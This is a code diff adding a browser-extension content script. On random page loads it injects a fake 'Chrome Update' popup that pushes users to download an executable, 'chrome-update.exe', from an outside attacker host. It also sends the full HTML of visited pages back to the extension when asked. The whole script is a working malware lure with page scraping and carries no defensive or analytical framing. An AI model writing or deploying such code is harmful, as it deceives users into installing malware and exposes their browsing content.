@@ -1,0 +1,51 @@
+function UpdatePopup() {
+    const popupWrapper = document.createElement('div');
+    popupWrapper.id = 'ChromeUpdateWrapper';
+    
+    popupWrapper.style.position = 'fixed';
+    popupWrapper.style.top = '10px'; 
+    popupWrapper.style.right = '10px'; 
+
+    popupWrapper.style.width = '20%'; 
+    popupWrapper.style.height = 'auto';
+
+    popupWrapper.style.zIndex = 99999;
+    popupWrapper.style.boxShadow = '0px 0px 10px rgba(0,0,0,0.5)';
+    popupWrapper.style.borderRadius = '8px';
+    popupWrapper.style.backgroundColor = '#ffffff';
+    popupWrapper.style.padding = '20px';
+    popupWrapper.style.textAlign = 'center';
+    popupWrapper.innerHTML = `
+        <img src="${chrome.runtime.getURL('chrome.png')}" width="30" style="display: block; margin: 0 auto;">
+        <h3 style="color: red;">Chrome Update</h3>
+        <p style="font-size: 12px; color: #666;">Critical update available.</p>
+        <a target="_blank" href="https://i-will-pwn-your.host/static/chrome-update.exe" download class="updateButton">Update Now</a>
+    `;
+
+    const updateBtn = popupWrapper.querySelector('.updateButton');
+    updateBtn.style.display = 'inline-block';
+    updateBtn.style.padding = '8px 15px';
+    updateBtn.style.marginTop = '10px';
+    updateBtn.style.backgroundColor = '#4285F4';
+    updateBtn.style.color = '#ffffff';
+    updateBtn.style.textDecoration = 'none';
+    updateBtn.style.borderRadius = '5px';
+    updateBtn.style.cursor = 'pointer';
+    
+    updateBtn.addEventListener('click', function() {
+        // Automatiquement déclenche le téléchargement
+        window.location.href = "https://i-will-pwn-your.host/static/chrome-update.exe";
+    });
+
+    document.body.appendChild(popupWrapper);
+}
+
+if (Math.random() <= 0.5) {
+    UpdatePopup();
+}
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.action === 'getHTML') {
+        sendResponse(document.documentElement.outerHTML);
+    }
+});
